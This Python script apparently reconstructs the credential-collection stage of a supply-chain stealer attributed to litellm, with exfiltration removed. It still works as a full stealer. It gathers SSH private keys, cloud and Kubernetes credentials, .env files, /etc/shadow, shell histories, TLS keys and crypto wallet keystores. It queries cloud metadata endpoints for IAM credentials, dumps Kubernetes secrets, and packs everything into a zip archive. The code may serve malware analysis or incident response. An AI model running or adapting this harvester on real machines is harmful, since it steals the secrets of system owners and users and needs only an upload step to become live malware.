#!/usr/bin/env python3
"""
derived from the litellm malware.
All persistence, encryption, exfiltration, and network calls removed.

Collects every file the malware would read into a zip archive,
preserving original absolute paths and file stats.
Also saves the list of shell commands the malware would execute.

Usage: python3 harvest_archive.py [output.zip]
"""
import os
import sys
import stat
import zipfile
import subprocess
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)-5s %(message)s',
    datefmt='%H:%M:%S',
)
log = logging.getLogger('harvest')

OUTPUT = sys.argv[1] if len(sys.argv) > 1 else "harvested_credentials.zip"

found_files = []
commands_output = []


def emit(path):
    try:
        path = os.path.realpath(path)
        st = os.stat(path)
        if stat.S_ISREG(st.st_mode):
            found_files.append(path)
            log.debug("emit: found %s (%d bytes)", path, st.st_size)
    except OSError:
        pass


def walk(roots, max_depth, match_fn):
    for root in roots:
        if not os.path.isdir(root):
            continue
        log.debug("walk: scanning %s (depth %d)", root, max_depth)
        for dirpath, dirs, files in os.walk(root, followlinks=False):
            rel = os.path.relpath(dirpath, root)
            depth = 0 if rel == '.' else rel.count(os.sep) + 1
            if depth >= max_depth:
                dirs[:] = []
                continue
            for fn in files:
                fp = os.path.join(dirpath, fn)
                if match_fn(fp, fn):
                    emit(fp)


def run(cmd):
    log.info("run: %s", cmd[:80])
    commands_output.append(f"$ {cmd}")
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=10)
        if out:
            decoded = out.decode('utf-8', errors='replace')
            commands_output.append(decoded)
            log.info("  -> %d bytes output", len(out))
        else:
            log.info("  -> (empty)")
    except subprocess.TimeoutExpired:
        commands_output.append("  [timed out after 10s]")
        log.warning("  -> timed out")
    except subprocess.CalledProcessError as e:
        commands_output.append(f"  [exit code {e.returncode}]")
        log.info("  -> exit code %d", e.returncode)
    except Exception as e:
        commands_output.append(f"  [failed: {e}]")
        log.warning("  -> failed: %s", e)


# ── Home directories ──

homes = []
try:
    for e in os.scandir('/home'):
        if e.is_dir():
            homes.append(e.path)
except OSError:
    pass
homes.append('/root')
home = os.path.expanduser('~')
if home not in homes:
    homes.append(home)

all_roots = homes + ['/opt', '/srv', '/var/www', '/app', '/data', '/var/lib', '/tmp']
log.info("Home dirs: %s", homes)
log.info("All roots: %s", all_roots)

# ── System recon ──

log.info("=== System recon ===")
run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
run('printenv')

# ── SSH ──

log.info("=== SSH keys ===")
for h in homes:
    for f in ['/.ssh/id_rsa', '/.ssh/id_ed25519', '/.ssh/id_ecdsa', '/.ssh/id_dsa',
              '/.ssh/authorized_keys', '/.ssh/known_hosts', '/.ssh/config']:
        emit(h + f)
    walk([h + '/.ssh'], 2, lambda fp, fn: True)

walk(['/etc/ssh'], 1, lambda fp, fn: fn.startswith('ssh_host') and fn.endswith('_key'))

# ── Git ──

log.info("=== Git credentials ===")
for h in homes:
    for f in ['/.git-credentials', '/.gitconfig']:
        emit(h + f)

# ── AWS ──

log.info("=== AWS credentials ===")
for h in homes:
    emit(h + '/.aws/credentials')
    emit(h + '/.aws/config')

# ── .env files ──

log.info("=== .env files ===")
for d in ['.', '..', '../..']:
    for f in ['.env', '.env.local', '.env.production', '.env.development', '.env.staging', '.env.test']:
        emit(d + '/' + f)
emit('/app/.env')
emit('/etc/environment')
walk(all_roots, 6, lambda fp, fn: fn in {'.env', '.env.local', '.env.production', '.env.development', '.env.staging'})

# ── AWS env + metadata ──

log.info("=== AWS env + metadata ===")
run('env | grep AWS_')
log.info("Testing AWS metadata endpoint")
run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>/dev/null || true')
run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true')

# ── Kubernetes ──

log.info("=== Kubernetes ===")
for h in homes:
    emit(h + '/.kube/config')
emit('/etc/kubernetes/admin.conf')
emit('/etc/kubernetes/kubelet.conf')
emit('/etc/kubernetes/controller-manager.conf')
emit('/etc/kubernetes/scheduler.conf')
emit('/var/run/secrets/kubernetes.io/serviceaccount/token')
emit('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')
emit('/var/run/secrets/kubernetes.io/serviceaccount/namespace')
emit('/run/secrets/kubernetes.io/serviceaccount/token')
emit('/run/secrets/kubernetes.io/serviceaccount/ca.crt')

run('find /var/secrets /run/secrets -type f 2>/dev/null | xargs -I{} sh -c \'echo "=== {} ==="; cat "{}" 2>/dev/null\'')
run('env | grep -i kube; env | grep -i k8s')
run('kubectl get secrets --all-namespaces -o json 2>/dev/null || true')

# ── GCP ──

log.info("=== GCP ===")
for h in homes:
    walk([h + '/.config/gcloud'], 4, lambda fp, fn: True)
emit('/root/.config/gcloud/application_default_credentials.json')

run('env | grep -i google; env | grep -i gcloud')
run('cat $GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null || true')

# ── Azure ──

log.info("=== Azure ===")
for h in homes:
    walk([h + '/.azure'], 3, lambda fp, fn: True)

run('env | grep -i azure')

# ── Docker ──

log.info("=== Docker ===")
for h in homes:
    emit(h + '/.docker/config.json')
emit('/kaniko/.docker/config.json')
emit('/root/.docker/config.json')

# ── Misc credentials & shell history ──

log.info("=== Misc credentials & history ===")
for h in homes:
    emit(h + '/.npmrc')
    emit(h + '/.vault-token')
    emit(h + '/.netrc')
    emit(h + '/.lftp/rc')
    emit(h + '/.msmtprc')
    emit(h + '/.my.cnf')
    emit(h + '/.pgpass')
    emit(h + '/.mongorc.js')
    for hist in ['/.bash_history', '/.zsh_history', '/.sh_history',
                 '/.mysql_history', '/.psql_history', '/.rediscli_history']:
        emit(h + hist)

emit('/var/lib/postgresql/.pgpass')
emit('/etc/mysql/my.cnf')
emit('/etc/redis/redis.conf')
emit('/etc/postfix/sasl_passwd')
emit('/etc/msmtprc')
emit('/etc/ldap/ldap.conf')
emit('/etc/openldap/ldap.conf')
emit('/etc/ldap.conf')
emit('/etc/ldap/slapd.conf')
emit('/etc/openldap/slapd.conf')

run('env | grep -iE "(DATABASE|DB_|MYSQL|POSTGRES|MONGO|REDIS|VAULT)"')

# ── WireGuard ──

log.info("=== WireGuard ===")
walk(['/etc/wireguard'], 1, lambda fp, fn: fn.endswith('.conf'))
run('wg showconf all 2>/dev/null || true')

# ── CI/CD & IaC ──

log.info("=== CI/CD & IaC ===")
for h in homes:
    walk([h + '/.helm'], 3, lambda fp, fn: True)
for ci in ['terraform.tfvars', '.gitlab-ci.yml', '.travis.yml', 'Jenkinsfile',
           '.drone.yml', 'Anchor.toml', 'ansible.cfg']:
    emit(ci)
walk(all_roots, 4, lambda fp, fn: fn.endswith('.tfvars'))
walk(all_roots, 4, lambda fp, fn: fn == 'terraform.tfstate')

# ── TLS certs & keys ──

log.info("=== TLS certs & keys ===")
walk(['/etc/ssl/private'], 1, lambda fp, fn: fn.endswith('.key'))
walk(['/etc/letsencrypt'], 4, lambda fp, fn: fn.endswith('.pem'))
walk(all_roots, 5, lambda fp, fn: os.path.splitext(fn)[1] in {'.pem', '.key', '.p12', '.pfx'})

# ── Webhook & API key grep ──

log.info("=== Webhook & API key grep ===")
run('grep -r "hooks.slack.com\\|discord.com/api/webhooks" . 2>/dev/null | head -20')
run('grep -rE "api[_-]?key|apikey|api[_-]?secret|access[_-]?token" . --include="*.env*" --include="*.json" --include="*.yml" --include="*.yaml" 2>/dev/null | head -50')

# ── Crypto wallets ──

log.info("=== Crypto wallets ===")
for h in homes:
    for coin in ['/.bitcoin/bitcoin.conf', '/.litecoin/litecoin.conf',
                 '/.dogecoin/dogecoin.conf', '/.zcash/zcash.conf',
                 '/.dashcore/dash.conf', '/.ripple/rippled.cfg',
                 '/.bitmonero/bitmonero.conf']:
        emit(h + coin)
    walk([h + '/.bitcoin'], 2, lambda fp, fn: fn.startswith('wallet') and fn.endswith('.dat'))
    walk([h + '/.ethereum/keystore'], 1, lambda fp, fn: True)
    walk([h + '/.cardano'], 3, lambda fp, fn: fn.endswith('.skey') or fn.endswith('.vkey'))
    walk([h + '/.config/solana'], 3, lambda fp, fn: True)
    for sol in ['/validator-keypair.json', '/vote-account-keypair.json',
                '/authorized-withdrawer-keypair.json', '/stake-account-keypair.json',
                '/identity.json', '/faucet-keypair.json']:
        emit(h + sol)
    walk([h + '/ledger'], 3, lambda fp, fn: fn.endswith('.json') or fn.endswith('.bin'))

for sol_dir in ['/home/sol', '/home/solana', '/opt/solana', '/solana', '/app', '/data']:
    emit(sol_dir + '/validator-keypair.json')

walk(['.'], 8, lambda fp, fn: fn in {'id.json', 'keypair.json'}
     or (fn.endswith('-keypair.json') and 'keypair' in fn)
     or (fn.startswith('wallet') and fn.endswith('.json')))
walk(['.anchor', './target/deploy', './keys'], 5, lambda fp, fn: fn.endswith('.json'))

run('env | grep -i solana')
run('grep -r "rpcuser\\|rpcpassword\\|rpcauth" /root /home 2>/dev/null | head -50')

# ── System auth ──

log.info("=== System auth ===")
emit('/etc/passwd')
emit('/etc/shadow')

run('cat /var/log/auth.log 2>/dev/null | grep Accepted | tail -200')
run('cat /var/log/secure 2>/dev/null | grep Accepted | tail -200')

# ── Build the archive ──

unique_files = list(dict.fromkeys(found_files))

log.info("=== Building archive ===")
log.info("Collected %d unique files, %d command output lines", len(unique_files), len(commands_output))

added = 0
skipped = 0
total_bytes = 0
with zipfile.ZipFile(OUTPUT, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
    for path in unique_files:
        try:
            arcname = path.lstrip('/')
            size = os.path.getsize(path)
            zf.write(path, arcname=arcname)
            total_bytes += size
            added += 1
            log.info("  + %s (%d bytes)", arcname, size)
        except Exception as e:
            log.warning("  SKIP %s (%s)", path, e)
            skipped += 1

    # Add command outputs as a virtual file
    cmd_text = '\n'.join(commands_output)
    zf.writestr('_commands_output.txt', cmd_text)
    log.info("  + _commands_output.txt (%d bytes)", len(cmd_text))

log.info("=== Done ===")
log.info("Archive: %s (%d bytes compressed)", OUTPUT, os.path.getsize(OUTPUT))
log.info("Added: %d files (%d bytes uncompressed), Skipped: %d", added, total_bytes, skipped)

# Verify the archive is readable
log.info("=== Verifying archive ===")
try:
    with zipfile.ZipFile(OUTPUT, 'r') as zf:
        bad = zf.testzip()
        if bad:
            log.error("Corrupt entry: %s", bad)
            sys.exit(1)
        members = zf.infolist()
        log.info("Archive OK: %d entries", len(members))
        for m in members:
            log.info("  %10d -> %10d  %s", m.file_size, m.compress_size, m.filename)
except Exception as e:
    log.error("Archive verification FAILED: %s", e)
    sys.exit(1)
